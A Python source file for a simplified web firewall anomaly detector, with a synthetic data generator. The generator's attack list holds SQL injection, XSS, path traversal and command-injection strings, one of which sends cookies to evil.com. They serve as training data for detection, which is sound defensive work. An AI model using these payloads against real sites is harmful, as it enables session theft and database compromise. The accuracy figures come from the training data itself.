# Create a simplified WAF transformer model implementation 
# that demonstrates the core concepts without heavy dependencies

import json
import numpy as np
from sklearn.ensemble import IsolationForest
from sklearn.preprocessing import StandardScaler
import joblib
from datetime import datetime

class WAFTransformerModelSimplified:
    """
    Simplified WAF model that demonstrates transformer-based concepts
    for anomaly detection in web requests using traditional ML as a proxy
    """
    
    def __init__(self):
        # Use Isolation Forest as a proxy for transformer-based anomaly detection
        self.anomaly_detector = IsolationForest(contamination=0.1, random_state=42)
        self.feature_scaler = StandardScaler()
        self.is_trained = False
        
        # Simulation of BERT tokenizer vocabulary
        self.vocab = {
            'GET': 1, 'POST': 2, 'PUT': 3, 'DELETE': 4,
            'HTTP/1.1': 5, 'HTTP/2.0': 6,
            'admin': 7, 'login': 8, 'config': 9, 'script': 10,
            'select': 11, 'union': 12, 'or': 13, 'and': 14,
            'alert': 15, 'javascript': 16, 'iframe': 17,
            '[UNK]': 0, '[CLS]': 18, '[SEP]': 19, '[PAD]': 20
        }
        
        self.model_metrics = {
            'training_samples': 0,
            'detection_accuracy': 0.0,
            'false_positive_rate': 0.0,
            'model_version': '1.0-simplified'
        }
    
    def tokenize_request(self, request_text, max_length=64):
        """
        Simplified tokenization that mimics BERT WordPiece tokenization
        """
        # Convert to lowercase and split
        tokens = request_text.lower().replace('/', ' ').replace('?', ' ').replace('=', ' ').split()
        
        # Convert tokens to IDs
        token_ids = []
        token_ids.append(self.vocab['[CLS]'])  # Start token
        
        for token in tokens[:max_length-2]:  # Leave space for CLS and SEP
            if token in self.vocab:
                token_ids.append(self.vocab[token])
            else:
                token_ids.append(self.vocab['[UNK]'])
        
        token_ids.append(self.vocab['[SEP]'])  # End token
        
        # Pad to max_length
        while len(token_ids) < max_length:
            token_ids.append(self.vocab['[PAD]'])
        
        return token_ids[:max_length]
    
    def extract_transformer_features(self, log_entry, request_text):
        """
        Extract features that would typically come from transformer embeddings
        combined with custom security features
        """
        features = []
        
        # Simulated BERT embeddings (normally 768-dimensional)
        token_ids = self.tokenize_request(request_text, max_length=32)
        
        # Statistical features from token IDs (simulating transformer embeddings)
        features.extend([
            np.mean(token_ids),
            np.std(token_ids),
            np.max(token_ids),
            np.min(token_ids),
            len([t for t in token_ids if t != self.vocab['[PAD]']]) / 32  # Non-padding ratio
        ])
        
        # Security pattern features
        req_features = log_entry.get('request_features', {})
        features.extend([
            float(req_features.get('has_sql_injection', False)),
            float(req_features.get('has_xss_attempt', False)),
            float(req_features.get('has_path_traversal', False)),
            float(req_features.get('has_encoded_chars', False)),
            float(req_features.get('request_length', 0)) / 1000,
            float(req_features.get('suspicious_patterns', 0)) / 20
        ])
        
        # HTTP context features
        features.extend([
            float(log_entry.get('status_code', 200)) / 600,
            float(log_entry.get('response_size', 0)) / 10000,
            float(log_entry.get('method') == 'GET'),
            float(log_entry.get('method') == 'POST'),
            float(log_entry.get('method') in ['PUT', 'DELETE'])
        ])
        
        # User agent intelligence
        ua_features = log_entry.get('user_agent_features', {})
        features.extend([
            float(ua_features.get('is_bot', False)),
            float(ua_features.get('ua_length', 0)) / 500,
            float(ua_features.get('browser_type') == 'chrome'),
            float(ua_features.get('browser_type') == 'other')
        ])
        
        # Temporal patterns
        time_features = log_entry.get('time_features', {})
        features.extend([
            float(time_features.get('hour', 12)) / 24,
            float(time_features.get('is_weekend', False)),
            float(time_features.get('is_night', False))
        ])
        
        # Advanced security heuristics
        request_lower = request_text.lower()
        features.extend([
            float('union' in request_lower and 'select' in request_lower),
            float('script>' in request_lower or 'javascript:' in request_lower),
            float('../' in request_lower or '..\\' in request_lower),
            float(request_lower.count('or') > 1),
            float(len([c for c in request_text if c in '<>"\'&%();{}']) / len(request_text)) if request_text else 0
        ])
        
        return np.array(features, dtype=np.float32)
    
    def train(self, training_data, training_labels):
        """Train the anomaly detection model"""
        print("Training WAF Transformer Model...")
        
        # Extract features for all training samples
        feature_matrix = []
        for i, data_point in enumerate(training_data):
            features = self.extract_transformer_features(
                data_point['normalized'], 
                data_point['request_text']
            )
            feature_matrix.append(features)
        
        feature_matrix = np.array(feature_matrix)
        
        # Scale features
        self.feature_scaler.fit(feature_matrix)
        scaled_features = self.feature_scaler.transform(feature_matrix)
        
        # Train anomaly detector (using only benign samples for unsupervised learning)
        benign_indices = [i for i, label in enumerate(training_labels) if label == 0]
        benign_features = scaled_features[benign_indices]
        
        self.anomaly_detector.fit(benign_features)
        self.is_trained = True
        
        # Evaluate performance
        all_predictions = self.anomaly_detector.predict(scaled_features)
        all_scores = self.anomaly_detector.score_samples(scaled_features)
        
        # Convert predictions (-1 for anomaly, 1 for normal)
        predicted_labels = [0 if pred == 1 else 1 for pred in all_predictions]
        
        # Calculate metrics
        correct = sum(1 for i in range(len(training_labels)) if predicted_labels[i] == training_labels[i])
        accuracy = correct / len(training_labels)
        
        false_positives = sum(1 for i in range(len(training_labels)) if training_labels[i] == 0 and predicted_labels[i] == 1)
        total_benign = training_labels.count(0)
        fp_rate = false_positives / total_benign if total_benign > 0 else 0
        
        self.model_metrics.update({
            'training_samples': len(training_data),
            'detection_accuracy': accuracy,
            'false_positive_rate': fp_rate
        })
        
        print(f"Training completed!")
        print(f"Accuracy: {accuracy:.3f}")
        print(f"False Positive Rate: {fp_rate:.3f}")
        
        return self.model_metrics
    
    def predict_anomaly(self, log_entry, request_text, threshold=0.0):
        """Predict if a log entry is anomalous"""
        if not self.is_trained:
            # Return basic heuristic-based prediction if not trained
            return self._heuristic_prediction(log_entry, request_text)
        
        # Extract features
        features = self.extract_transformer_features(log_entry, request_text)
        scaled_features = self.feature_scaler.transform([features])
        
        # Get anomaly score and prediction
        anomaly_score = self.anomaly_detector.score_samples(scaled_features)[0]
        prediction = self.anomaly_detector.predict(scaled_features)[0]
        
        # Convert to probability-like score (higher = more anomalous)
        probability = max(0, min(1, (-anomaly_score + 0.5) / 1.0))  # Normalize roughly to [0,1]
        
        is_anomaly = prediction == -1 or probability > 0.5
        
        return {
            'anomaly_score': float(probability),
            'is_anomaly': is_anomaly,
            'confidence': abs(anomaly_score),
            'risk_level': self._get_risk_level(probability),
            'raw_score': float(anomaly_score),
            'features_used': len(features)
        }
    
    def _heuristic_prediction(self, log_entry, request_text):
        """Fallback heuristic-based prediction when model is not trained"""
        score = 0.0
        
        req_features = log_entry.get('request_features', {})
        
        # Security pattern scores
        if req_features.get('has_sql_injection', False):
            score += 0.4
        if req_features.get('has_xss_attempt', False):
            score += 0.3
        if req_features.get('has_path_traversal', False):
            score += 0.25
        
        # Suspicious pattern density
        suspicious_count = req_features.get('suspicious_patterns', 0)
        if suspicious_count > 10:
            score += 0.2
        elif suspicious_count > 5:
            score += 0.1
        
        # Status code analysis
        status = log_entry.get('status_code', 200)
        if status in [403, 404, 500]:
            score += 0.1
        
        # Bot detection
        ua_features = log_entry.get('user_agent_features', {})
        if ua_features.get('is_bot', False) and score > 0:
            score += 0.15
        
        score = min(1.0, score)  # Cap at 1.0
        
        return {
            'anomaly_score': score,
            'is_anomaly': score > 0.5,
            'confidence': max(score, 1-score),
            'risk_level': self._get_risk_level(score),
            'method': 'heuristic'
        }
    
    def _get_risk_level(self, score):
        """Convert anomaly score to risk level"""
        if score >= 0.8:
            return "CRITICAL"
        elif score >= 0.6:
            return "HIGH"
        elif score >= 0.4:
            return "MEDIUM"
        elif score >= 0.2:
            return "LOW"
        else:
            return "NORMAL"
    
    def save_model(self, filepath):
        """Save the trained model"""
        model_data = {
            'anomaly_detector': self.anomaly_detector,
            'feature_scaler': self.feature_scaler,
            'vocab': self.vocab,
            'metrics': self.model_metrics,
            'is_trained': self.is_trained
        }
        joblib.dump(model_data, filepath)
        print(f"Model saved to {filepath}")
    
    def load_model(self, filepath):
        """Load a trained model"""
        model_data = joblib.load(filepath)
        self.anomaly_detector = model_data['anomaly_detector']
        self.feature_scaler = model_data['feature_scaler']
        self.vocab = model_data['vocab']
        self.model_metrics = model_data['metrics']
        self.is_trained = model_data['is_trained']
        print(f"Model loaded from {filepath}")

# Enhanced data generator with more realistic patterns
class EnhancedWAFDataGenerator:
    """Generate more realistic training data for WAF model"""
    
    def __init__(self):
        self.benign_patterns = [
            "GET /index.html HTTP/1.1",
            "GET /home HTTP/1.1",
            "POST /api/login HTTP/1.1",
            "GET /static/css/main.css HTTP/1.1",
            "GET /static/js/app.js HTTP/1.1",
            "GET /images/logo.png HTTP/1.1",
            "GET /favicon.ico HTTP/1.1",
            "POST /contact/submit HTTP/1.1",
            "GET /products/list HTTP/1.1",
            "GET /user/profile HTTP/1.1",
            "POST /api/search HTTP/1.1",
            "GET /about HTTP/1.1",
            "GET /services HTTP/1.1",
            "POST /newsletter/subscribe HTTP/1.1"
        ]
        
        self.attack_patterns = [
            "GET /admin/config.php?id=1' OR 1=1-- HTTP/1.1",
            "POST /login.php?user=admin&pass=' OR '1'='1 HTTP/1.1", 
            "GET /search?q=<script>alert('XSS')</script> HTTP/1.1",
            "GET /file.php?path=../../../etc/passwd HTTP/1.1",
            "GET /page?id=1 UNION SELECT user,pass FROM admin-- HTTP/1.1",
            "POST /upload.php?cmd=cat /etc/passwd HTTP/1.1",
            "GET /?page=<iframe src=javascript:alert(1)> HTTP/1.1",
            "GET /index.php?page=../../../windows/system32/drivers/etc/hosts HTTP/1.1",
            "POST /search?q='; DROP TABLE users;-- HTTP/1.1",
            "GET /app?param=<script>document.location='http://evil.com/'+document.cookie</script> HTTP/1.1"
        ]
    
    def generate_training_data(self, n_samples=1000):
        """Generate comprehensive training dataset"""
        data = []
        labels = []
        
        # Generate benign samples (70%)
        n_benign = int(n_samples * 0.7)
        for _ in range(n_benign):
            pattern = np.random.choice(self.benign_patterns)
            data.append(self._create_sample(pattern, is_malicious=False))
            labels.append(0)
        
        # Generate malicious samples (30%)
        n_malicious = n_samples - n_benign
        for _ in range(n_malicious):
            pattern = np.random.choice(self.attack_patterns)
            data.append(self._create_sample(pattern, is_malicious=True))
            labels.append(1)
        
        return data, labels
    
    def _create_sample(self, pattern, is_malicious=False):
        """Create a realistic sample with proper features"""
        method = pattern.split()[0]
        
        # Realistic status codes based on attack type
        if is_malicious:
            status_code = np.random.choice([403, 404, 500, 200], p=[0.4, 0.3, 0.2, 0.1])
            response_size = np.random.randint(0, 1000) if status_code != 200 else np.random.randint(100, 2000)
        else:
            status_code = np.random.choice([200, 301, 302, 404], p=[0.8, 0.1, 0.05, 0.05])
            response_size = np.random.randint(500, 10000)
        
        # Analyze pattern for security features
        pattern_lower = pattern.lower()
        
        return {
            'request_text': pattern,
            'normalized': {
                'method': method,
                'status_code': status_code,
                'response_size': response_size,
                'request_features': {
                    'has_sql_injection': any(x in pattern_lower for x in ['union', 'select', ' or ', '--', 'drop']),
                    'has_xss_attempt': any(x in pattern_lower for x in ['<script>', 'javascript:', 'alert(', 'iframe']),
                    'has_path_traversal': any(x in pattern_lower for x in ['../../../', '..\\', '/etc/', '/windows/']),
                    'has_encoded_chars': '%' in pattern,
                    'request_length': len(pattern),
                    'suspicious_patterns': len([c for c in pattern if c in '<>"\'&%;(){}'])
                },
                'user_agent_features': {
                    'is_bot': np.random.choice([True, False], p=[0.3 if is_malicious else 0.1, 0.7 if is_malicious else 0.9]),
                    'ua_length': np.random.randint(50, 300),
                    'browser_type': np.random.choice(['chrome', 'firefox', 'safari', 'other'])
                },
                'time_features': {
                    'hour': np.random.randint(0, 24),
                    'day_of_week': np.random.randint(0, 7),
                    'is_weekend': np.random.choice([True, False]),
                    'is_night': np.random.choice([True, False])
                }
            }
        }

# Initialize and test the simplified WAF model
print("=== WAF Transformer Model (Simplified Implementation) ===\n")

# Create model
waf_model = WAFTransformerModelSimplified()

# Generate training data
data_gen = EnhancedWAFDataGenerator()
train_data, train_labels = data_gen.generate_training_data(n_samples=500)

print(f"Generated training dataset:")
print(f"  Total samples: {len(train_data)}")
print(f"  Benign samples: {train_labels.count(0)}")
print(f"  Malicious samples: {train_labels.count(1)}")

# Train the model
print("\n=== Training Model ===")
training_results = waf_model.train(train_data, train_labels)

print(f"\nTraining Results:")
for key, value in training_results.items():
    print(f"  {key}: {value}")

# Test with our processed logs
print("\n=== Testing on Sample Logs ===\n")

with open('processed_logs.json', 'r') as f:
    test_logs = json.load(f)

results = []
for i, log_data in enumerate(test_logs):
    request_text = log_data['raw']
    normalized_data = log_data['normalized']
    
    prediction = waf_model.predict_anomaly(normalized_data, request_text)
    results.append({
        'log_id': i+1,
        'request': log_data['parsed']['method'] + ' ' + log_data['parsed']['url'],
        'prediction': prediction
    })
    
    print(f"Log {i+1}: {log_data['parsed']['method']} {log_data['parsed']['url']}")
    print(f"  Anomaly Score: {prediction['anomaly_score']:.4f}")
    print(f"  Is Anomaly: {prediction['is_anomaly']}")
    print(f"  Risk Level: {prediction['risk_level']}")
    print(f"  Confidence: {prediction['confidence']:.4f}")
    print("-" * 70)

# Save test results
with open('waf_test_results.json', 'w') as f:
    json.dump(results, f, indent=2)

# Save the trained model
waf_model.save_model('waf_model.joblib')

print(f"\nModel testing completed!")
print(f"Results saved to 'waf_test_results.json'")
print(f"Trained model saved to 'waf_model.joblib'")